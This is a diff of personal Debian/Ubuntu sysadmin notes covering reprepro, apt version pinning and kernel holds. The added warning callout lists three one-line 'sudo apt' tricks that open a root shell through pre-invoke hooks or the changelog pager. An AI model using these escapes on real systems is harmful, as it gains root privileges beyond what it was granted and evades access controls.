@@ -16,7 +16,9 @@ https://wiki.debian.org/DebianRepository/UseThirdParty
 - Ubuntu 22 changed the required compression for packages. In case of an improperly archived package it might have to be extracted and re-packaged or the proper format requested from the package maintainers.
 
 `reprepro`: produce, manage and sync a local repository of Debian packages
-See also Jurjen's notes for packages on `deb.rug.nl`: [Obsidian](obsidian://vault/lwp-docs/wiki/software/adding-a-package-to-deb.rug.nl) | [LWP Docs](https://lwp.pages-817d151d.nip.io/documentation/wiki/wiki/software/adding-a-package-to-deb.rug.nl/)
+
+See also [Jurjen's notes for packages on deb.rug.nl in Obsidian](obsidian://vault/lwp-docs/wiki/software/adding-a-package-to-deb.rug.nl) and [Jurjen's notes for packages on deb.rug.nl in LWP Docs](https://lwp.pages-817d151d.nip.io/documentation/wiki/wiki/software/adding-a-package-to-deb.rug.nl/)
+
 ```bash
 # add package to repository
 sudo reprepro \
@@ -52,7 +54,18 @@ Install specific version
 sudo apt install package_name=package_version
 ```
 
-#tech/vulnerability [permission escalation with `sudo apt`](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/) ^9f90c9
+> [!warning]- `sudo apt` vulnerability/exploit to get a root shell
+> #tech/vulnerability #tech/exploit [permission escalation with `sudo apt`](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/) ^9f90c9
+> ```bash
+> # Method 1: apt-get update pre-invoke shell
+> sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash
+> # Method 2: start shell from interactive apt-get changelog
+> sudo apt-get changelog apt << '#!/bin/sh'
+> # Method 3: apt install pre-invoke shell (from file)
+> TF=$(mktemp)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+sudo apt-get install -c $TF sl
+> ```
 
 `apt-get clean`: empty cache (downloaded packages) [Foss](https://itsfoss.com/clear-apt-cache/)
 [apt-fast](https://github.com/ilikenwf/apt-fast): shellscript wrapper for apt-get and aptitude that can drastically improve apt download times by downloading packages in parallel, with multiple connections per package
@@ -61,7 +74,7 @@ Speed up downloads by using multiple parallel connections: (unofficial) [package
 
 #### Packages
 
-Pin/hold a package version, for example Kernel version (see [RUG notes > Puppet > module Kernel Maintenance](obsidian://vault/rug/lwp/Puppet/modules/kernel_maintenance) and [code](file://git/puppetserver/our-modules/kernel_maintenance/manifests/init.pp))
+Pin/hold a package version, for example Kernel version (see [Work notes LWP > Puppet > module Kernel Maintenance](obsidian://vault/rug/lwp/Puppet/modules/kernel_maintenance) and [code](file://git/puppetserver/our-modules/kernel_maintenance/manifests/init.pp))
 ```bash
 apt-mark showhold | grep -q -e '^linux-headers-${pin}' -e '^linux-image-${pin}' -e '^linux-modules-${pin}' -e '^linux-modules-extra-${pin}'
 apt-mark hold linux-headers-${pin}-generic linux-image-${pin}-generic linux-modules-${pin}-generic linux-modules-extra-${pin}-generic
